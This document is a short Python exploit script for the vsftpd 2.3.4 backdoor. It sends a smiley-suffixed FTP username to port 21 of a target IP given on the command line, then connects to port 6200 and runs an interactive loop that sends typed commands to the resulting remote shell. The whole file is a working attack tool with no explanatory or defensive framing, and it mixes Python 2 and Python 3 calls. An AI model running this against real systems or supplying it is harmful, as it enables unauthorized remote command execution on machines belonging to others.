import socket
import time
import sys

def exploit(ip):
	ftp = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	try:
		ftp.settimeout(2)
		ftp.connect((ip,21))
		ftp.send(b'USER AAAAA:)\n')
		ftp.send(b'PASS AAAAA:)\n')
		ftp.close()
		print('[+] exploit success')
		ret = 0
	
	except:
		print("[!!] ["+ip + "] exploit failed...")
		ret = 1
	
	if ret == 0:
		print("[*] conecting....\n")
		backdoor = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		backdoor.connect((ip,6200))
		print('[+] shell opened\n')
		state = 'True'
		while state == 'True':
			cmd = raw_input() + '\n'
			if cmd == 'exit\n':
				backdoor.send(cmd)
				backdoor.close()
				print('Closed...')
				state = ('close')
			else:
				backdoor.send(cmd)
				rcv = backdoor.recv(1024)
				print(rcv)
	elif ret == 1:
		print("[!!] "+ip+" can't connect....\n")
	else:
		print("Error")
		backdoor.close()

exploit(sys.argv[1])
